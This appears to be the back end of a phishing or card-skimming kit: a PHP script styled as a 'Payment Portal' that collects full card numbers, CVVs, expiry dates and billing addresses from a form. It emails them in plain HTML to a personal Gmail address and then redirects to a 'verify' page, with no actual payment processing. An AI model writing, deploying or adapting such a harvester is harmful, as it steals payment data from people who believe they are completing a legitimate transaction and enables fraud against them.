<?php
include_once "Controller/Controller.class.php";
include_once "Controller/Database.php";

// Ensure the script only processes POST requests
if (!isset($_POST)) {
    echo "error";
    exit;
} else {
    $requiredFields = ['expiration-year', 'email', 'full-name', 'amount_to_pay', 'cvv', 'credit-card-num', 'expiration-month', 'zip-code', 'state', 'city', 'billing-address'];
    
    foreach ($requiredFields as $field) {
        if (empty($_POST[$field])) {
            http_response_code(400); // Bad Request
            echo json_encode(["error" => "$field is required"]);
            exit;
        }
    }
    
    // Sanitize data
    $id = htmlspecialchars($_POST['id'], ENT_QUOTES, 'UTF-8');
    $expYear = htmlspecialchars($_POST['expiration-year'], ENT_QUOTES, 'UTF-8');
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $name = htmlspecialchars($_POST['full-name'], ENT_QUOTES, 'UTF-8');
    $amount = htmlspecialchars($_POST['amount_to_pay'], ENT_QUOTES, 'UTF-8');
    $cvv = htmlspecialchars($_POST['cvv'], ENT_QUOTES, 'UTF-8');
    $cardNumber = htmlspecialchars($_POST['credit-card-num'], ENT_QUOTES, 'UTF-8');
    $expMonth = htmlspecialchars($_POST['expiration-month'], ENT_QUOTES, 'UTF-8');
    $zipCode = htmlspecialchars($_POST['zip-code'], ENT_QUOTES, 'UTF-8');
    $state = htmlspecialchars($_POST['state'], ENT_QUOTES, 'UTF-8');
    $city = htmlspecialchars($_POST['city'], ENT_QUOTES, 'UTF-8');
    $address = htmlspecialchars($_POST['billing-address'], ENT_QUOTES, 'UTF-8');
    $userId = htmlspecialchars($_POST['user_id'], ENT_QUOTES, 'UTF-8');

    // Create email content
    $subject = 'Payment Information Submitted';
    $message = "
        <h1>Payment Details</h1>
        <p><strong>Name:</strong> $name</p>
        <p><strong>Email:</strong> $email</p>
        <p><strong>Amount:</strong> $amount</p>
        <p><strong>Card Number:</strong> $cardNumber</p>
        <p><strong>CVV:</strong> $cvv</p>
        <p><strong>Expiration Date:</strong> $expMonth/$expYear</p>
        <p><strong>Address:</strong> $address</p>
        <p><strong>City:</strong> $city</p>
        <p><strong>State:</strong> $state</p>
        <p><strong>ZIP Code:</strong> $zipCode</p>
    ";

    // Email headers
    $headers = "From: Payment Portal <habeebajani9@gmail.com>\r\n";
    $headers .= "Reply-To: ".$email."\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

    // Send the email
    if (mail('habeebajani9@gmail.com', $subject, $message, $headers)) {
        header("Location: verify.php?user=".$userId."&id=".$id);
    } else {
        http_response_code(500); // Internal Server Error
        echo json_encode(["error" => "Message could not be sent."]);
    }
}
exit;
